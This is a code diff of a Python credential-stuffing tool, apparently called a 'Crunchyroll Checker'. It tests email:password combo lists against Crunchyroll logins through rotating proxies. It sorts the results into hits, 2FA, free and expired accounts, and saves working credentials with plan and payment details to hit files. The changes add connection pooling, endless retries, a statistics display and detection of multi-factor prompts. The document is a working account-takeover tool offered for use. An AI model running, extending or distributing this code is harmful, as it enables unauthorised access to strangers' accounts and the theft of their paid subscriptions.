@@ -1,10 +1,9 @@
 import requests
+from requests.adapters import HTTPAdapter
 import concurrent.futures
 import threading
 import time
-import json
 import uuid
-import random
 import os
 from datetime import datetime
 import configparser
@@ -14,6 +13,7 @@ import sys
 GREEN = "\033[92m"
 RED = "\033[91m"
 YELLOW = "\033[93m"
+LAVENDER = "\033[38;2;230;190;255m"
 RESET = "\033[0m"
 
 config = configparser.ConfigParser()
@@ -51,13 +51,37 @@ USER_AGENT = "Crunchyroll/deviceType: MeowMal; appVersion: 4.10.0; osVersion: 12
 
 proxies_list = []
 proxy_cycle = None
-proxies_list = []
-proxy_cycle = None
 hits = 0
+bads = 0
+free = 0
+retries = 0
+errors = 0
+two_fa = 0
 checked = 0
 total_accounts = 0
 start_time = 0
+UI_MODE = "2"
 lock = threading.Lock()
+proxy_lock = threading.Lock()
+
+def clear_screen():
+    if os.name == 'nt':
+        os.system('cls')
+    else:
+        sys.stdout.write('\033[H\033[2J')
+        sys.stdout.flush()
+
+def display_cui():
+    clear_screen()
+    print(LOGO)
+    print(f"{LAVENDER}Cui-\n")
+    print(f"Total - {checked}/{total_accounts}")
+    print(f"Hits - {hits}")
+    print(f"2FA - {two_fa}")
+    print(f"Bads - {bads}")
+    print(f"Free - {free}")
+    print(f"Retries - {retries}")
+    print(f"Errors - {errors}{RESET}\n")
 
 def load_proxies():
     global proxies_list, proxy_cycle
@@ -75,8 +99,8 @@ def get_proxy():
     if not proxies_list:
         return None
     
-    proxy_str = next(proxy_cycle)
-    parts = proxy_str.split(':')
+    with proxy_lock:
+        proxy_str = next(proxy_cycle)
     
     if "://" in proxy_str:
         return {
@@ -110,7 +134,12 @@ def update_title():
             cpm = 0
         
         title = f"Crunchyroll Checker | CPM: {cpm} | Hits: {hits} | Checked: {checked}/{total_accounts}"
-        ctypes.windll.kernel32.SetConsoleTitleW(title)
+        if os.name == 'nt':
+            ctypes.windll.kernel32.SetConsoleTitleW(title)
+        
+        if UI_MODE == "1":
+            display_cui()
+            
         time.sleep(1)
 
 def date_to_unix(date_str):
@@ -121,14 +150,15 @@ def date_to_unix(date_str):
         return 0
 
 def check_account(email, password):
-    global checked
-    attempt_count = 0
-    max_attempts = 20
+    global checked, hits, bads, free, retries, errors, two_fa
     
-    while attempt_count < max_attempts:
-        attempt_count += 1
+    session = requests.Session()
+    adapter = HTTPAdapter(pool_connections=500, pool_maxsize=500)
+    session.mount("https://", adapter)
+    session.mount("http://", adapter)
+    
+    while True:
         proxy = get_proxy()
-        session = requests.Session()
         session.proxies = proxy
         
         device_id = str(uuid.uuid4())
@@ -165,10 +195,24 @@ def check_account(email, password):
                 pass
             elif response.status_code == 401:
                 with lock:
-                    print(f"{RED}[-] Invalid {email}{RESET}")
+                    resp_json = {}
+                    try:
+                        resp_json = response.json()
+                    except: pass
+                    
+                    if resp_json.get("code") == "multi_factor_required" or "mfa" in str(resp_json).lower():
+                        two_fa += 1
+                        if UI_MODE == "2":
+                            print(f"{YELLOW}[!] 2FA: {email}{RESET}")
+                    else:
+                        bads += 1
+                        if UI_MODE == "2":
+                            print(f"{RED}[-] Invalid {email}{RESET}")
                     checked += 1
                 return 
             else:
+                with lock:
+                    retries += 1
                 continue
             
             token_data = response.json()
@@ -212,7 +256,6 @@ def check_account(email, password):
             payment_method = "None"
             expiry_date = "N/A"
             expiry_unix = 0
-            is_expired = False
             
             if sub_response.status_code == 200:
                 sub_data = sub_response.json()
@@ -242,7 +285,6 @@ def check_account(email, password):
                     else:
                         plan_name = tier if tier else product_name
                     
-                    auto_renew = str(item.get("auto_renew", False)).lower()
                     if "auto_renew" in item:
                         auto_renew = str(item["auto_renew"]).lower()
                     elif "is_renewing" in item:
@@ -260,7 +302,6 @@ def check_account(email, password):
                         expiry_unix = date_to_unix(expiry_date)
                         current_unix = int(time.time())
                         if expiry_unix < current_unix:
-                            is_expired = True
                             plan_name = "Expired"
 
             if plan_name == "Free" and account_id:
@@ -282,44 +323,59 @@ def check_account(email, password):
                 if expiry_date != "N/A":
                     expiry_date = expiry_date.split('T')[0]
 
-                capture_line = f"{email}:{password} | Country = {country} | Plan = {plan_name} | Auto-Renew = {auto_renew} | Free-Trial = {free_trial} | Payment-Methode = {payment_method} | Expiry-Date = {expiry_date} |\n"
+                capture_line = f"{email}:{password} | Country = {country} | Plan = {plan_name} | Auto-Renew = {auto_renew} | Free-Trial = {free_trial} | Payment-Method = {payment_method} | Expiry-Date = {expiry_date} |\n"
                 
                 with lock:
-                    global hits
                     hits += 1
-                    print(f"{GREEN}[+] HIT: {email} | {plan_name}{RESET}")
+                    if UI_MODE == "2":
+                        print(f"{GREEN}[+] HIT: {email} | {plan_name}{RESET}")
                     with open(OUTPUT_FILE, 'a', encoding='utf-8') as f:
                         f.write(capture_line)
                     with open('hits.txt', 'a', encoding='utf-8') as f:
                         f.write(f"{email}:{password}\n")
             elif plan_name == "Expired":
                  with lock:
-                    print(f"{RED}[-] EXPIRED: {email}{RESET}")
+                    bads += 1
+                    if UI_MODE == "2":
+                        print(f"{RED}[-] EXPIRED: {email}{RESET}")
             else:
                 with lock:
-                    print(f"{YELLOW}[-] FREE: {email}{RESET}")
+                    free += 1
+                    if UI_MODE == "2":
+                        print(f"{YELLOW}[-] FREE: {email}{RESET}")
             
             with lock:
                 checked += 1
             return 
 
         except Exception:
+            with lock:
+                errors += 1
             continue 
 
-    with lock:
-        print(f"{RED}[-] Failed {email} (Max Attempts){RESET}")
-        checked += 1
-
 def main():
-    os.system('cls') 
+    clear_screen()
     print(LOGO)
     print(f"{RED}By MeowMal Dev's{RESET}")
+    
+    global UI_MODE
+    prompt = f"\n[{YELLOW}1{RESET}] CUI            [{YELLOW}2{RESET}] Live Logs\n\n[{YELLOW}>{RESET}] Choice: "
+    sys.stdout.write(prompt)
+    sys.stdout.flush()
+    UI_MODE = input().strip()
+    if UI_MODE not in ["1", "2"]:
+        UI_MODE = "2"
+        
     load_proxies()
     
     accounts = []
     try:
         with open(ACCOUNTS_FILE, 'r', encoding='utf-8') as f:
-            accounts = [line.strip().split(':') for line in f if ':' in line]
+            for line in f:
+                line = line.strip()
+                if ':' in line:
+                    email, password = line.split(':', 1)
+                    accounts.append((email, password))
     except FileNotFoundError:
         print(f"{ACCOUNTS_FILE} not found!")
         return
